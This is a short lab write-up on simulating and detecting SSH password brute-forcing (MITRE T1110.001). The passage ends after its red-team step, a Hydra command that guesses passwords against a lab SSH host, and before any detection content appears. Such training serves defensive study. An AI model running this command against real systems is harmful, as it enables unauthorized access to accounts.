# Lab 01: SSH Brute Force Simulation & Detection

* **MITRE ATT&CK:** [T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
* **Objective:** Simulate an automated SSH credential guessing attack and identify the resulting host-level authentication artifacts.

---

### 🔴 1. Red Team Simulation
Using **Hydra** from Kali Linux against an isolated Ubuntu target (`192.168.56.102`):

```bash
hydra -l testuser -P passwords.txt ssh://192.168.56.102 -t 4
